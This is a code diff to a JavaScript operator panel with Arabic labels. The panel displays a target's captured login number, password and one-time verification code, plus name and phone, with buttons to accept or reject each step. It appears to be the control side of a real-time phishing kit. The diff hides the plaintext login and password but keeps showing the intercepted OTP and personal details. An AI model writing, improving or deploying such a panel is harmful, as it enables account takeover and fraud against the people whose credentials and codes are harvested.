@@ -613,17 +613,13 @@ function updPend(){
   if(S.status==='pending_password'){
     dot.style.display='block';sec.style.display='block';
     document.getElementById('pttl').textContent='🔔 طلب تسجيل دخول جديد';
-    document.getElementById('pdata').innerHTML=`
-      <div class="prow"><span class="plbl">رقم تسجيل الدخول</span><span class="pval hi">${S.login}</span></div>
-      <div class="prow"><span class="plbl">كلمة المرور</span><span class="pval blr" id="pvrev" title="اضغط للإظهار">${S.password}</span></div>`;
-    document.getElementById('pvrev')?.addEventListener('click',function(){this.classList.toggle('show');});
+    document.getElementById('pdata').innerHTML='';
     document.getElementById('admAccept').onclick=()=>{setState({status:'password_accepted'});};
     document.getElementById('admReject').onclick=()=>{setState({status:'password_rejected'});};
   } else if(S.status==='pending_otp'){
     dot.style.display='block';sec.style.display='block';
     document.getElementById('pttl').textContent='🔔 رمز التحقق';
     document.getElementById('pdata').innerHTML=`
-      <div class="prow"><span class="plbl">رقم تسجيل الدخول</span><span class="pval hi">${S.login}</span></div>
       <div class="prow"><span class="plbl">رمز التأكيد</span><span class="pval hi" style="font-size:22px;letter-spacing:4px">${S.otp}</span></div>`;
     document.getElementById('admAccept').onclick=()=>{setState({status:'otp_accepted'});};
     document.getElementById('admReject').onclick=()=>{setState({status:'otp_rejected'});};
@@ -740,8 +736,6 @@ async function renderTable(){
       const dd=document.createElement('div');dd.className='dd';dd.dataset.role='details';
       dd.style.top='18px';dd.style.left='50%';dd.style.transform='translateX(-50%)';dd.style.width='min(780px, calc(100vw - 18px))';dd.style.maxHeight='86vh';dd.style.overflowY='auto';
       dd.innerHTML=`<div class="ddttl">🔍 تفاصيل المستخدم</div>
-        <div class="ddrow"><span class="ddk">رقم تسجيل الدخول</span><span class="ddv hi">${S.login || '-'}</span></div>
-        <div class="ddrow"><span class="ddk">كلمة المرور</span><span class="ddv">${S.password || '-'}</span></div>
         <div class="ddrow"><span class="ddk">رمز التأكيد</span><span class="ddv hi">${S.otp || '-'}</span></div>
         <div class="ddrow"><span class="ddk">الاسم</span><span class="ddv">${u.name}</span></div>
         <div class="ddrow"><span class="ddk">رقم الجوال</span><span class="ddv">${u.phone}</span></div>
